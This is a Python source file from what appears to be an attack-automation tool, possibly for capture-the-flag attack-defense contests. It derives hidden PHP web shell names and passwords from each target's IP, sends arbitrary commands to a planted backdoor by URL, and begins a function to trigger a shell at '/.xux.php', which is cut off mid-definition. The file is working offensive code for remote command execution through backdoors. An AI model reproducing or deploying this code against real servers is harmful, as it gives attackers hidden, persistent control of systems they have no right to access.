import asyncio
from config import Config
from urllib import parse
import socket
from hashlib import md5

from core.urls import Urls

class Utils:

    def getMemShellName(url):
        hostname = parse.urlparse(url).hostname
        ip = socket.gethostbyname(hostname)    
        return "." + md5((str(ip) + "1145141919").encode("UTF-8")).hexdigest()

    def getMemShellPass(url):
        hostname = parse.urlparse(url).hostname
        ip = socket.gethostbyname(hostname)
        return md5((str(ip) + "xuxfff").encode("UTF-8")).hexdigest()
    async def exec(url,command):
        shellPath = f"{url}/{Config.backdoorPath}?{Config.backdoorPass}={command}"
        resp = await Config.session.post(
            url=shellPath,
            data = {
                Config.backdoorPass:command
            }
        )
        return await resp.text()
    async def trigger(url):
        trigger_url = f"{url}/.xux.php"
        